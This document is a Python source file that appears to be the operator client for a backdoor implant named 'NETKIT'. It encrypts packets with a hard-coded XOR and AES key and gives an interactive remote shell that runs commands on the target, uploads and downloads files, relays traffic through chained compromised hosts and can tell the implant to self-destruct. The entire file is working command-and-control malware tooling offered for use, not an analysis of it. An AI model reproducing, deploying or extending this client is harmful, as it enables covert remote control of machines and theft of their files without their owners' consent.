#!/usr/bin/env python3

from pwn import p8, xor
import socket
from Crypto.Cipher import AES
import time
import os
import sys


AUTH_PASSWORD = 0

CMD_FILE_READ = 0
CMD_FILE_WRITE = 1
CMD_FILE_EXEC = 2
CMD_PROXY = 3
CMD_EXIT = 4


class PacketReq:
    def __init__(self, auth_id: int, password: bytes, cmd_id: int, content: bytes):
        self.auth_id = auth_id
        self.password = password
        self.cmd_id = cmd_id
        self.content = content

    def __bytes__(self):
        return self.encrypt(p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content)

    def encrypt(self, plaintext: bytes) -> bytes:
        print = lambda *x: ...

        data = xor(plaintext, b"NETKIT_XOR")[:len(plaintext)]
        print('\nxor:', data)

        padlen = 16-(len(data) % 16)
        if padlen == 16:
            padlen = 0

        data += padlen.to_bytes(1, 'little') * padlen
        print(f'\npad: {data} ({len(data)-padlen})')

        iv = b"IV"*8
        cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
        data = iv + cipher.encrypt(data)
        print('\naes:', data)

        return data


class PacketRes:
    def __init__(self, ciphertext: bytes):
        data = self.decrypt(ciphertext)
        self.retv = int.from_bytes(data[:4], 'little', signed=True)
        self.domain = data[4]
        self.content = data[5:]

    def decrypt(self, ciphertext: bytes) -> bytes:
        print = lambda *x: ...

        print("\n==========")
        print(f"\nraw data:", ciphertext)

        cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, ciphertext[:16])
        padded = cipher.decrypt(ciphertext[16:])
        print("\naes decrypt (padded):", padded)
        pad_size = ord(padded[len(padded)-1:])
        if 0 < pad_size < 16:
            for b in padded[:-pad_size:-1]:
                padded_correct = b == pad_size
                if not padded_correct:
                    break
            if padded_correct:
                data = padded[:-pad_size]
            else:
                data = padded
        else:
            data = padded

        print('\naes decrypt:', data)

        data = xor(data, b"NETKIT_XOR")[:len(data)]
        print('\nxor decrypt:',  data)

        return data


def encapsulate_proxies(host_list: list[tuple[str, int]], packet: PacketReq) -> PacketReq:
    for i, addr in enumerate(host_list[:-1]):
        next_addr = host_list[i+1]
        content = socket.inet_aton(next_addr[0])
        port = socket.htons(next_addr[1]).to_bytes(2, 'little')
        packet = PacketReq(0, packet.password, CMD_PROXY, content + port + bytes(packet))

    return packet


def decapsulate_proxies(host_list: list[tuple[str, int]], res: PacketRes) -> PacketRes:
    for _ in host_list[:-1]:
        res.content = PacketRes(res.content).content

    return res


def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(addr)

    print = lambda *x: ...
    
    data = sendbuf
    print('\nsend:', data)

    start = time.perf_counter()
    s.sendall(data)
    data = s.recv(65536)
    end = time.perf_counter()
    s.close()

    print(f"time: {(end - start) * 1000}ms")

    if len(data) == 0:
        raise Exception("[!] auth failed")
    
    print(f'recv ({len(data)} bytes):', data)

    return data


def sendrecv_encapsulate(host_list: list[tuple[str, int]], original_packet: PacketReq) -> PacketRes:
    encap_packet_req: PacketReq = encapsulate_proxies(host_list, original_packet)
    res_raw: bytes = sendrecv(host_list[0], bytes(encap_packet_req))
    decap_packet_res: PacketRes = decapsulate_proxies(host_list, PacketRes(res_raw))

    return decap_packet_res


def download(host_list: list[tuple[str, int]], password: bytes, filename: str):
    packet = PacketReq(0, password, CMD_FILE_READ, filename.encode())
    rsp = sendrecv_encapsulate(host_list, packet)

    filename_flat = filename.replace("/", "__")
    with open(filename_flat, "wb") as f:
        f.write(rsp.content)

    return rsp


def upload(host_list: list[tuple[str, int]], password: bytes, filename_local: str, filename_remote: str) -> PacketRes:
    with open(filename_local, "rb") as f:
        content = f.read()

    req = PacketReq(0, password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)
    rsp = sendrecv_encapsulate(host_list, req)

    return rsp


def exec(host_list: list[tuple[str, int]], password: bytes, pwd: str, cmd: str):
    if cmd != "" and pwd != "":
        complete_cmd = f"cd {pwd} && {cmd}"
    elif cmd == "":
        raise ValueError("[!] no cmd given (developers' fault)")
    elif pwd == "":
        complete_cmd = cmd

    req = PacketReq(0, password, CMD_FILE_EXEC, complete_cmd.encode())
    rsp = sendrecv_encapsulate(host_list, req)

    return rsp


def server_exit(host_list: list[tuple[str, int]], password):
    req = PacketReq(0, password, CMD_EXIT, b"")
    rsp = sendrecv_encapsulate(host_list, req)

    return rsp


def main(argv):
    password = b"password"
    pwd = os.path.abspath("/")

    # get all proxy
    host_list = []
    if len(argv) > 1:
        for arg in argv[1:]:
            ip, port = arg.split(":")
            host_list.append((ip, int(port)))

    if host_list == []:
        print(f"[!] usage: {argv[0]} <<ip>:<port>> [<ip>:<port>] [<ip>:<port>] ...")
        return

    while True:
        nice_hosts = [ip + ":" + str(port) for ip, port in host_list]
        prefix = "->".join(nice_hosts) + pwd + " $ "
        cmd_argv = input(prefix).strip(" ").split()
        if cmd_argv == []:
            continue
        elif cmd_argv[0].lower() == "download":
            if len(cmd_argv) != 2:
                print("usage: download <remote_path>")
                continue

            rsp = download(host_list, password, cmd_argv[1])
            if rsp.retv < 0:
                print(f"[-] failed to download file '{cmd_argv[1]}' from server to local")
                continue

            print(f"[+] file successfully downloaded '{cmd_argv[1]}' from server to local (saved with flat filename in pwd)")
        elif cmd_argv[0].lower() == "upload":
            if len(cmd_argv) != 3:
                print("usage: upload <local_path> <remote_path>")
                continue

            rsp = upload(host_list, password, cmd_argv[1], cmd_argv[2])
            if rsp.retv < 0:
                print(f"[-] failed to upload file '{cmd_argv[1]}' to the server as '{cmd_argv[2]}'")
                continue

            print(f"[+] successfully uploaded file '{cmd_argv[1]}' as '{cmd_argv[2]}' to server")
        elif cmd_argv[0].lower() == "hosts":
            hosts_usage = lambda: (
                print("usage:"),
                print("- hosts push <ip>:<port>"),
                print("- hosts pop\n")
            )

            if len(cmd_argv) == 1 or cmd_argv[1] not in {"push", "pop"}:
                hosts_usage()
                continue

            if cmd_argv[1] == "push":
                if len(cmd_argv) != 3:
                    hosts_usage()
                    continue

                ip, port = cmd_argv[2].split(":")
                host_list.append((ip, int(port)))
                print(f"[+] successfully added device {ip}:{port} to hosts list")
            elif cmd_argv[1] == "pop":
                if len(cmd_argv) != 2:
                    hosts_usage()
                    continue

                if len(host_list) == 1:
                    print("[!] 1 host in list. cannot pop")
                    continue

                host_list.pop(-1)
                print(f"[+] successfully popped host {ip}:{port}")
        elif cmd_argv[0].lower() == "[self-destruct]":
            server_exit(host_list, password)
            print(f"[+] successfully self destructed server {host_list[-1]}")
            host_list.pop(-1)
        elif cmd_argv[0].lower() == "cd":
            pwd_new = os.path.normpath(os.path.join(pwd, cmd_argv[1]))
            rsp = exec(host_list, password, "", f"test -d {pwd_new}")
            if rsp.retv == 0x100:
                print(f"[-] cannot access '{pwd_new}': No such file or directory\n")

            pwd = pwd_new
        elif cmd_argv[0].lower() == "exit":
            break
        else:
            cmd = ' '.join(cmd_argv)
            rsp = exec(host_list, password, pwd, cmd)
            if rsp.retv == 0x7f00:
                print(f"command not found (something went wrong): {cmd.split(' ')[0]}")
                continue
            elif rsp.retv != 0:
                print(f"retv: {rsp.retv}, domain: {rsp.domain}")

            print(rsp.content.decode("utf-8", "backslashreplace"))


if __name__ == "__main__":
    main(sys.argv)
